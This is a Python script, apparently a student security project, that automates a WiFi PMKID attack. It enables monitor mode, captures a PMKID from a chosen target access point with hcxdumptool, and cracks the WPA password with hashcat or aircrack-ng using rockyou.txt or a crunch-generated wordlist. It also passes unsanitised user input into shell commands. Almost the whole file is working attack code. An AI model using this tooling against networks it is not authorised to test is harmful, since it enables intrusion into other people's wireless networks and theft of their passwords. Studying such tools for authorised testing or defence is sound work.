import os
import time
import subprocess
from subprocess import check_call

# Global variable to store the wireless interface name
interface = None

def start():
    """Install required tools for WiFi penetration testing"""
    print("\nInstalling necessary Tools..")
    print("This may take a while, please be patient\n")
    os.system("apt-get update && apt-get install xterm aircrack-ng hcxtools hcxdumptool crunch reaver hashcat -y")
    os.system("sleep 3 && clear")

def main():
    """Main menu function - displays options and handles user input"""
    cmd = os.system("clear")
    print("""\033[1;92m
                                            
-------------------------------------------------------------------------  
[+] Security Project: WIFI Hacking PMKID Attack
[+] Press CTRl + B to go back to main menu

(1) PMKID Attack - Step 1: Monitor & Capture PMKID
(2) PMKID Attack - Step 2: Crack PMKID Password
(3) Scan Networks
(4) Create your own passwordlist

(00)Exit
----------------------------------------------------------------------- """)
    print("\n")
    number = input("[+] Enter the number : ")

    if number == "1":
        pmkid_step1_capture()
    elif number == "2":
        pmkid_step2_crack()
    elif number == "3":
        show_networks()
    elif number == "4":
        create_passwordlist()
    elif number == "00":
        exit()
    else:
        print("Invalid number..")
        time.sleep(2)
        main()
    
def start_monitor_mode():
    """Enable monitor mode on the specified wireless interface"""
    global interface
    interface = input("\nEnter the interface (Default: wlan0): ").strip()
    if not interface:
        interface = "wlan0"
    
    # Store original interface name for reference
    original_interface = interface
    
    subprocess.run("airmon-ng start " + interface, shell=True)
    subprocess.run("airmon-ng check kill", shell=True)

    print(f"\n{original_interface} set to monitor mode..")
    
    # Prompt user to update interface name if it changed (e.g., wlp3s0 -> wlp3s0mon)
    print(f"\n[+] Monitor mode enabled. Your interface may have changed.")
    print(f"[+] Original interface: {original_interface}")
    updated_interface = input(f"[+] Enter the new interface name (e.g., {original_interface}mon) or press Enter to keep '{original_interface}': ").strip()
    
    if updated_interface:
        interface = updated_interface
        print(f"[+] Interface updated to: {interface}")
    else:
        print(f"[+] Using original interface name: {interface}")
    
    time.sleep(4)

def stop_monitor_mode():
    """Disable monitor mode and return interface to managed mode"""
    global interface
    if interface is None:
        print("\n[!] Monitor mode is not started yet.")
        return

    subprocess.run(["airmon-ng", "stop", interface])
    print(f"\nMonitor mode stopped on {interface}..")
    interface = None
    time.sleep(4)
    main()

def show_networks():
    """Scan and display available wireless networks using airodump-ng"""
    global interface
    if interface is None:
        print("\n[!] Monitor mode is not started yet.")
        return
    print("\n[+] Scanning for networks... Press CTRL+C to stop.\n")
    time.sleep(2)
    os.system(f"airodump-ng {interface}")

def pmkid_step1_capture():
    """Step 1: Monitor networks and capture PMKID from target AP"""
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()

    print("\n" + "="*60)
    print("PMKID ATTACK - STEP 1: MONITOR & CAPTURE")
    print("="*60)

    # Scan for networks to identify target
    print("\n[+] Scanning for available networks...")
    show_networks()

    # Get target AP details from user
    bssid = input("\nEnter the BSSID of the target AP: ").strip()
    channel = input("Enter Channel of the target AP: ").strip()
    
    if not bssid or not channel:
        print("[!] BSSID and Channel are required!")
        time.sleep(2)
        pmkid_step1_capture()
        return

    # Set interface to target channel
    subprocess.run(["iwconfig", interface, "channel", channel])

    # Start PMKID capture using hcxdumptool
    print(f"\n[+] Starting hcxdumptool to capture PMKID from {bssid}...")
    print("[+] Press CTRL+C to stop when PMKID is captured.")
    time.sleep(3)
    
    try:
        os.system(f"hcxdumptool -i {interface} --enable_status=1 -o pmkid.pcapng --filterlist_ap={bssid} --filtermode=2")
    except KeyboardInterrupt:
        print("\n[+] PMKID capture stopped by user.")

    # Check if PMKID was successfully captured
    pmkid_path = os.path.join(os.getcwd(), "pmkid.pcapng")
    if os.path.exists(pmkid_path):
        print(f"\n[✔] PMKID captured successfully! Saved at: {pmkid_path}")
        print("\n[+] You can now proceed to Step 2 to crack the password.")
    else:
        print("\n[✘] PMKID capture failed or file not found.")

    time.sleep(5)
    main()

def pmkid_step2_crack():
    """Step 2: Convert PMKID to hash format and crack password using hashcat"""
    print("\n" + "="*60)
    print("PMKID ATTACK - STEP 2: CRACK PASSWORD")
    print("="*60)

    # Check if PMKID capture file exists
    pmkid_path = "pmkid.pcapng"
    if not os.path.exists(pmkid_path):
        print(f"\n[!] {pmkid_path} not found in current directory.")
        print("[+] You need to run Step 1 first to capture PMKID, or")
        custom_path = input("Enter the full path to your pmkid.pcapng file: ").strip()
        if not custom_path or not os.path.exists(custom_path):
            print("[!] Invalid path or file not found!")
            time.sleep(2)
            main()
            return
        pmkid_path = custom_path

    print(f"\n[+] Using PMKID file: {pmkid_path}")

    # Convert pcapng to hashcat-compatible 22000 format
    print("[+] Converting pcapng to hash file...")
    try:
        subprocess.run(["hcxpcapngtool", "-o", "pmkid.22000", pmkid_path], check=True)
        print("[✔] Successfully converted to pmkid.22000")
    except subprocess.CalledProcessError:
        print("[✘] Failed to convert PMKID file. Make sure hcxtools is installed.")
        time.sleep(2)
        main()
        return
    except FileNotFoundError:
        print("[✘] hcxpcapngtool not found. Make sure hcxtools is installed.")
        time.sleep(2)
        main()
        return

    # Verify hash file was created successfully
    hashfile = "pmkid.22000"
    if not os.path.exists(hashfile):
        print("[✘] Failed to create hash file!")
        time.sleep(2)
        main()
        return

    # Select wordlist for password cracking
    print("\n[1] Use rockyou.txt (default)")
    print("[2] Use custom wordlist")
    choice = input("\n[+] Enter your choice: ").strip()

    if choice == "1":
        wordlist = "rockyou.txt"
        gz_path = "rockyou.txt.gz"
        if not os.path.exists(wordlist):
            if os.path.exists(gz_path):
                print("[+] Extracting rockyou.txt.gz ...")
                os.system(f"gzip -d {gz_path}")
            else:
                print("[!] rockyou.txt or rockyou.txt.gz not found!")
                print("[+] Please download rockyou.txt or provide a custom wordlist.")
                time.sleep(2)
                main()
                return
    elif choice == "2":
        wordlist = input("\nEnter the full path to the wordlist: ").strip()
        if not os.path.exists(wordlist):
            print("[!] Wordlist not found!")
            time.sleep(2)
            main()
            return
    else:
        print("[!] Invalid choice.")
        time.sleep(2)
        main()
        return

    # Start password cracking using hashcat
    print(f"\n[+] Starting PMKID cracking with hashcat using {wordlist}...")
    print("[+] This may take a while depending on the wordlist size...")
    print("[+] To exit Press CTRL +C")
    
    try:
        os.system(f"hashcat -m 22000 {hashfile} {wordlist}")
        print("\n[✔] Hashcat cracking completed!")
    except KeyboardInterrupt:
        print("\n[+] Cracking stopped by user.")

    # Ask user if they want to return to main menu
    print("\n[+] Password cracking process completed!")
    choice = input("[+] Do you want to go back to main menu? (y/n): ").strip().lower()
    if choice == 'y' or choice == 'yes':
        main()
    else:
        print("[+] Exiting...")
        exit()

def create_passwordlist():
    """Generate custom password list using crunch tool"""
    print("\n[+] Size of the file and time taken to create the password list depends on your input..")
    print("\n[+] Enter the characters to be included in the password list.")
    print("[+] Example: if you only want list include numbers enter : 0123456789")
    characters = input("\n[+] Enter the characters : ").strip()
    length = input("\n[+] Enter the minimum length of the password (8/64) : ").strip()
    output = input("\n[+] Enter the maximum length of the password (8/64) : ").strip()
    print("\nCreating password list... Please wait.")
    # Generate password list using crunch with specified parameters
    subprocess.run(f"crunch {length} {output} {characters} -o passwordlist.txt", shell=True)
    # Display where password list was created
    a = os.getcwd()
    print(f"\nPassword list created at {a}\n")
    time.sleep(5)
    
    # Optional: Use generated password list for handshake cracking
    choice = input("\nDo you want to crack handshake using this password list? (y/n) : ")
    if choice == "y":
        handshake_path = input("\n[+] Enter the path of the handshake file: ").strip()
        print("\nTo exit Press CTRL +C")
        os.system(f"aircrack-ng {handshake_path} -w passwordlist.txt")
    time.sleep(15)
    main()

if __name__ == "__main__":
    # Install required tools and start the main program
    start()
    main()
